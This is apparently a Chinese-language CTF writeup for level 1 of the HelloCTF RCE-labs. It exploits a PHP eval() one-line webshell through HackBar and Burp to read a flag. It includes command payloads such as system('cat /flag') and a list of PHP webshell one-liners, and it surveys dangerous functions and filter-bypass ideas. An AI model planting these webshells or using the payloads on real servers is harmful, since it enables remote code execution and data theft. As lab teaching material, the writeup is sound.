---
title: RCE-labs Level1 wp
published: 2026-10-07
pinned: false
description: 第一关 · 一句话木马与代码执行
tags: [ctf,web]
category: node
draft: false
---



# HelloCTF RCE-labs 第一关 · 一句话木马与代码执行 —— Writeup

| 项目 | 内容 |
|---|---|
| 靶场 | HelloCTF RCE 靶场（github.com/ProbiusOfficial/RCE-labs，作者 探姬） |
| 题型 | Web / PHP 代码执行（Code Execution / RCE） |
| 目标 | http://80-566505c7-d9d5-4295-bb5d-72beeafaad5f.challenge.ctfplus.cn/ |
| 工具 | 新版 HackBar（DevTools 内置版）、Burp Suite Community v2026.8 |
| 结果 | 拿到 HelloCTF{...}（以实际回显为准） |

---

## 一、题目

打开靶机，页面直接把自己的源码打印了出来（这是 `highlight_file(__FILE__)` 的效果）：

```php
<?php
include ("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date: 2024-08-11 14:34
# @Repo: github.com/ProbiusOfficial/RCE-labs
# @email: admin@hello-ctf.com
# @link: hello-ctf.com

—— HelloCTF —— RCE靶场 ：一句话木马和代码执行 ——

【代码执行(Code Execution)】 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的 eval() 函数或Python中的 exec() 函数。

当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd');");，也被归为代码执行漏洞。

我们平时最常见的一句话木马就用的 eval() 函数，如下所示（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）

try POST:
    a=echo "Hello,World!";

*/
eval($_POST['a']);
highlight_file(__FILE__);
?>
```

题面给了两个关键提示：

1. `try POST: a=echo "Hello,World!";` —— 用 **POST** 方式、参数名为 **a**、值是 PHP 代码
2. 可控参数 `a` 会被送进 `eval()`

---

## 二、题目分析

### 2.1 逐行解读

| 代码 | 含义 |
|---|---|
| `include("get_flag.php")` | 同作用域引入另一个文件 —— flag 的来路大概率在里面 |
| `/* ... */` 大段注释 | 出题人写的教学文案，**不是要执行的代码** |
| `eval($_POST['a'])` | **漏洞本体**：把 POST 参数 `a` 当 PHP 代码执行 |
| `highlight_file(__FILE__)` | 打印本文件源码 —— 所以页面才会把源码摊开给你看 |

### 2.2 漏洞定位：一句话木马

`eval($_POST['a'])` 本身就是最经典的**一句话木马**。它危险的地方在于：

> **`eval()` 执行的是"代码"，不是"数据"。**

普通写法 `echo $_POST['a']` 会把你输入的东西当**字符串**原样输出；
而 `eval($_POST['a'])` 会把你输入的东西**当程序跑一遍**：

```
你输入的字符串  ==  服务器将要执行的 PHP 代码
```

于是"可控参数"直接变成了"任意代码执行"。

### 2.3 代码执行 vs 命令执行

| 类型 | 谁在执行 | 典型函数 |
|---|---|---|
| **代码执行** | 该**语言**的解析器（Zend 引擎） | `eval()` `assert()` `call_user_func()` |
| **命令执行** | 操作**系统**的 shell | `system()` `exec()` `shell_exec()` |

两者的桥梁：代码执行里可以调用命令执行 ——
`eval("system('cat /etc/passwd');")` 这种也归为代码执行漏洞（题面注释里特意点明了这一点）。

---

## 三、解题过程

### 3.0 发 payload 的三条铁律

动手之前先记住这三点，能省掉 90% 的坑：

| # | 规则 | 违反的后果 |
|---|---|---|
| 1 | payload 里**不要写 PHP 开闭标签** | `eval` 内部已经是 PHP 模式，混进标签会报 `syntax error, unexpected '<'` |
| 2 | 语句结尾**必须带分号** | 报 `syntax error, unexpected end of file` |
| 3 | 必须**用 POST 传参**，并带上 `Content-Type: application/x-www-form-urlencoded` | `$_POST['a']` 为空 → `eval()` 空转 → 页面毫无反应 |

第 3 条最容易忽略，原理见 **4.2 节**。

---

### 3.1 打通入口（验证漏洞）

payload 用题面给的示例：

```
a=echo "Hello,World!";
```

页面回显 `Hello,World!` 即证明漏洞是活的。

#### 方式一：HackBar（新版 DevTools 内置版）

> 注意版本差异：新版 HackBar 是**开发者工具里的一个页签**，界面是下方这排大写按钮，
> 与老的 HackBar V2 侧边栏版完全不同。
>
> ```
> LOAD | SPLIT | EXECUTE | TEST | SQLi | XSS | LFI | SSRF
> URL 文本框 -> [开关] Use POST method + [下拉] enctype -> Body 文本框 -> MODIFY HEADER
> ```

| 步骤 | 操作 | 界面位置 |
|---|---|---|
| 1 | 浏览器打开靶机页面，按 `F12`，点 **HackBar** 页签 | DevTools 顶部 |
| 2 | 点 **LOAD** 把当前页 URL 自动填进 URL 框（已填好可跳过） | 面板顶部 |
| 3 | **拨开 `Use POST method` 开关** —— 最关键的一步，不开就是 GET | 开关行 |
| 4 | `enctype` 下拉保持 `application/x-www-form-urlencoded` | 开关行右侧 |
| 5 | **Body** 文本框填入 `a=echo "Hello,World!";` | Body 区域 |
| 6 | 点 **EXECUTE**（是大写，不叫 "Execute"） | 面板右上 |

`SPLIT / TEST / SQLi / XSS / LFI / SSRF` 这几个按钮本题全用不上，不用去点。

> **为什么 HackBar 里不用操心 Content-Type？**
> 因为第 4 步那个 `enctype` 下拉框，干的就是设置 `Content-Type` 请求头。
> 插件在背后替你加了，所以你无感。Burp 是裸改报文，没有这个下拉框，一切得手写。

#### 方式二：Burp Suite

> 环境：Burp Suite Community Edition **v2026.8**（新版 UI）

| 步骤 | 操作 | 位置 |
|---|---|---|
| 1 | 点 **Open browser**（内置浏览器，免配代理、免装证书） | `Proxy -> Intercept` 页右上角 |
| 2 | 在内置浏览器访问靶机，等页面完整加载 | 内置浏览器 |
| 3 | 找到那条 `GET /` 请求，右键 **Send to Repeater**（`Ctrl+R`） | `Proxy -> HTTP history` |
| 4 | 在 Repeater **左栏 Request 文本框**里改三处（见下表） | Repeater |
| 5 | 点 **Send**，右栏 Response 看回显 | Repeater 左上 |

**第 4 步的三处改动**：

| # | 改动 | 说明 |
|---|---|---|
| 1 | 第 1 行 `GET / HTTP/1.1` 改成 `POST / HTTP/1.1` | Burp **不会自动换方法**，必须手改 |
| 2 | 在 `Host:` 下新增一行 `Content-Type: application/x-www-form-urlencoded` | 见 4.2 节，不加则 `$_POST` 为空 |
| 3 | 头与 body 之间**留一整行真正的空行**，然后写 `a=echo "Hello,World!";` | HTTP 协议规定的分隔符，不能少 |

改完后的完整请求报文：

```http
POST / HTTP/1.1
Host: 80-566505c7-d9d5-4295-bb5d-72beeafaad5f.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: keep-alive

a=echo "Hello,World!";
```

要点：

- 原有的 `Accept` / `User-Agent` / `Connection` 等头**保留不动**即可，不影响
- `Content-Length` **不用自己算**，Burp 点 Send 时会自动重算
- 若点 Send 后 Response 毫无变化，切到 **Raw** 视图确认那个空行还在
  （Pretty 视图有时会把空行"藏"起来看不出来）

回显 `Hello,World!` —— 漏洞确认可用。

---

### 3.2 信息收集：读 get_flag.php 的源码

页面第一行 `include("get_flag.php")` 已经证明该文件就在当前目录、PHP 可读；
而页面自己就在用 `highlight_file()`，说明这个函数没被禁用 —— 直接拿来读它：

```
a=highlight_file("get_flag.php");
```

> `show_source()` 是 `highlight_file()` 的别名，效果完全一样。

回显拿到源码：

```php
<?php
$file_path = "/flag";
if ( file_exists($file_path) ) {
    $flag = file_get_contents($file_path);
}
else {
    $flag = "HelloCTF{Default_Flag}";
}

// 根目录下默认存有flag但不建议心存侥幸ww
```

**两条关键信息**：

1. 这个文件**没有定义任何函数**，只是把 `/flag` 的内容读进了变量 `$flag`
   —— 所以 `a=echo get_flag();` 这条路走不通（函数不存在）
2. 注释表明**根目录下确实存有 flag 文件**

---

### 3.3 取 flag

因为 `include` 和 `eval` 同处全局作用域（原理见 **4.3 节**），flag 已经被读进内存里的 `$flag` 了，
**不需要再读一遍文件**，直接打印即可：

```
a=echo $flag;
```

回显即为 flag。

**备选 payload**：

| 场景 | payload | 说明 |
|---|---|---|
| 变量名不确定 | `a=echo file_get_contents("/flag");` | 自己重新读一遍文件（代码执行路线） |
| 想确认 `/flag` 存在 | `a=print_r(scandir("/"));` | 列根目录文件名 |
| 想走命令执行路线 | `a=system("cat /flag");` | 借 PHP 调系统 shell |

> 如果回显是 `HelloCTF{Default_Flag}`，说明 `/flag` 不存在、代码走了 `else` 分支，
> 那是**占位符而不是真 flag** —— 通常意味着连的是本地自搭环境而非官方靶机。

---

### 3.4 payload 一览

| 阶段 | payload | 目的 |
|---|---|---|
| 1. 验证 | `a=echo "Hello,World!";` | 确认 eval 入口可用 |
| 2. 摸源码 | `a=highlight_file("get_flag.php");` | 找到 flag 的来路 |
| 3. 取 flag | `a=echo $flag;` | 直接打印已读入的变量 |

---

## 四、原理详解

### 4.1 eval() 为什么危险 —— 数据变成了代码

HTTP 请求里的参数，正常只是**数据**。但 `eval()` 把它**当代码解释**：

```
① 浏览器 POST 参数 a
        |
        v
② $_POST['a'] 取到字符串
        |
        v
③ eval() 把字符串当代码
        |
        v
④ 服务器执行并回显
```

一句话木马就是这个模型的最小实现。

### 4.2 为什么必须带 Content-Type

**HTTP 的 body 本身只是一串裸字节**，服务器光看字节并不知道该怎么理解它：

- 是按表单格式 `key=value&key=value` 拆？
- 还是当成一整块 JSON 文本？
- 还是当成上传的图片二进制？

`Content-Type` 就是回答这个问题的**说明书** —— 它不参与"传数据"，它负责"告诉对方数据是什么格式"。

PHP 的规则很死：`$_POST` **只有在** Content-Type 为下列之一时才会被填充：

| Content-Type | PHP 如何解析 body | `$_POST['a']` |
|---|---|---|
| `application/x-www-form-urlencoded` | 按表单拆成 key=value | 有值，等于你的 payload |
| `multipart/form-data` | 按多部分表单拆 | 有值（但报文写法啰嗦得多） |
| **完全不写这个头** | 不解析 | **空** |
| `application/json` | 不解析 | 空（需用 `php://input` 读原文） |

结论：本题若不加这个头，`$_POST['a']` 不存在，`eval()` 拿到空值 —— **页面一片死水**。

### 4.3 变量作用域 —— 为什么 echo $flag 能直接读到

用"房间"打比方：变量是放在房间里的东西，代码只能拿**自己所在房间**的东西。

| 规则 | 内容 |
|---|---|
| **include 的规则** | 被包含文件里的变量，落在 `include` 语句**所在的那个房间**。写在文件顶层，房间就是全局，`$flag` 是全局变量 |
| **eval 的规则** | `eval()` 不是函数，是**语言结构**。它不会另开一个房间，而是把代码**在原地摊开**，沿用当前位置的房间 |

本题这两句都写在 `index.php` 顶层 —— **同一个房间** —— `eval` 里伸手就能拿到 `$flag`。
这就是为什么 `a=echo $flag;` 是最短解。

**反例**：若出题人把 `index.php` 写成

```php
function show(){
    eval($_POST['a']);   // eval 跑进了函数内部的局部作用域
}
show();
```

那么 `a=echo $flag;` 会直接报 `Warning: Undefined variable` —— 不是代码错了，是**站错了房间**。
想跨墙得先声明：

```
a=global $flag; echo $flag;
```

或直接走全局数组：

```
a=echo $GLOBALS['flag'];
```

> 这也是为什么在别的题里会看到 payload 前面莫名多一句 `global $x;` —— 那些题的 `eval` 藏在函数里。

### 4.4 常见错误对照表

| 写法 / 现象 | 结果 | 原因 |
|---|---|---|
| `a=echo $flag;` | 成功打印 flag | 同作用域，直接拿 |
| `a=echo get_flag();` | 报 `Call to undefined function` | 源码里没有定义这个函数 |
| `a=echo '$flag';` | 原样打印 `$flag` | **单引号是字面量**，不解析变量 |
| `a=echo "flag=$flag";` | 成功 | 双引号会解析变量 |
| 页面毫无变化 | 失败 | 发成了 GET，或没带 `Content-Type`，`$_POST` 为空 |
| `syntax error: unexpected end of file` | 失败 | payload 少了结尾分号 |
| `syntax error: unexpected '<'` | 失败 | payload 里混进了 PHP 开闭标签 |
| Burp 返回 `400 Bad Request` | 失败 | Content-Length 与 body 不符（让 Burp 自动更新即可） |

---

## 五、扩展：同类危险函数（RCE 全景图）

`eval` 只是**同一类漏洞里最常见的那一个**。真正的规律是：

> **用户可控的数据，流进了危险函数，就成了漏洞。** 函数只是接收端，换汤不换药。

```
                        用户可控的输入
                              |
                    +---------+---------+
                    |         |         |
             (1) 代码执行类  (2) 命令执行类  (3) 间接执行类
                    |         |         |
              eval/assert  system/exec   include 包含
              create_func  shell_exec    unserialize
              preg_/e      passthru      call_user_func
                    |         |         |
                    +---------+---------+
                              |
                        服务器控制权
```

### 5.1 代码执行类（跑的是 PHP 代码）

| 函数 | 玩法 | 版本坑 |
|---|---|---|
| `eval()` | 你给什么它就当代码跑 | 一直可用 |
| `assert()` | 早期版本字符串参数会被当代码执行 | **PHP 7.2 之后不再执行字符串** |
| `create_function()` | 动态建匿名函数 | 7.2 弃用、8.0 移除 |
| `preg_replace()` 带 `/e` 修饰符 | 替换结果被当代码执行 | **PHP 7.0 已移除** |
| `call_user_func()` / `call_user_func_array()` | 调用任意函数，函数名可控即可打到 system | 一直可用 |
| `$f($x)` 变量函数 | `$_POST['f']($_POST['x'])` | 一句顶一个马 |
| `array_map()` / `usort()` | 回调参数可控 | 同上思路 |

### 5.2 命令执行类（跑的是系统命令）

| 函数 | 特点 |
|---|---|
| `system()` | 执行并**直接输出**结果（最常用） |
| `exec()` | 执行，只返回最后一行 |
| `shell_exec()` | 执行，返回全部输出；反引号包住命令就是它的语法糖 |
| `passthru()` | 执行并原样输出二进制流 |
| `popen()` / `proc_open()` | 开进程管道，可交互 |
| `pcntl_exec()` | 直接替换当前进程 |

冷门但真实存在的还有 `mail()` 的第 5 个参数、`putenv()` 配合 `LD_PRELOAD` 劫持动态库。

### 5.3 间接执行类（绕一道弯）

| 类型 | 说明 |
|---|---|
| **文件包含** `include` / `require` | 用 `php://filter`、日志包含、`/proc/self/environ` 把代码塞进去执行 |
| **反序列化** `unserialize()` | 构造 POP 链，借魔术方法 `__destruct` / `__wakeup` 触发 |
| **模板注入 SSTI** | Twig / Smarty / Jinja2 的模板语法被当代码渲染 |
| **表达式注入** | Java 的 SpEL / OGNL（Spring 系） |

### 5.4 一句话木马家族

```php
<?php @eval($_POST['a']); ?>      // 最经典，本题就是它
<?php assert($_POST['a']); ?>     // 老版本才有用
<?php system($_GET['c']); ?>      // 命令马
<?= `$_GET['c']`; ?>              // 反引号马，最短
<?php $_GET['f']($_GET['a']); ?>  // 动态函数马
<?php include $_GET['f']; ?>      // 包含马
```

再往上还有**免杀方向**的无字母数字马（异或、取反、自增构造字符串），属于另一个话题了。

### 5.5 其它语言的"同名兄弟"

| 语言 | 代码执行 | 命令执行 |
|---|---|---|
| Python | `eval()` `exec()` | `os.system` / `subprocess` / `pickle.loads`（反序列化 RCE） |
| JavaScript / Node | `eval()` `new Function()` | `child_process.exec` |
| Java | 无 | `Runtime.exec()` / `ProcessBuilder` |

### 5.6 找 sink 的通用排查链

1. **找入口** —— 用户输入从哪进（GET / POST / Cookie / 请求头 / 上传的文件）
2. **找 sink** —— 源码里 grep 上述这些危险函数名
3. **判版本** —— `/e`、`assert` 字符串执行这些老特性还灵不灵（`phpinfo()` 最直接）
4. **看过滤** —— 黑名单拦了什么、漏了什么（大小写、编码、关键字拆分）
5. **查禁用** —— `phpinfo()` 的 `disable_functions` 段，看目标函数是否被关掉

---

## 六、总结

1. `eval($_POST['a'])` 就是一句话木马 —— 用户输入直接被当代码执行，最典型的代码执行漏洞。
2. 发 payload 三件事：用 POST、带 `Content-Type: application/x-www-form-urlencoded`、结尾带分号。
3. `eval` 里不要写 PHP 开闭标签 —— 它已经在 PHP 模式里了。
4. `include` 与 `eval` 共享作用域 —— 被包含文件产生的全局变量在 `eval` 里可直接读取，所以 `a=echo $flag;` 是最短解。
5. 工具只是外壳：HackBar 用 `enctype` 下拉框替你加 `Content-Type`；Burp 裸改报文，一切都得手写。
6. RCE-labs 后续关卡只是把 sink 换成 `assert` / `system` / `call_user_func` 之类，
   流程完全一样：**打通入口 → 读源码 → 按源码取 flag**。

---

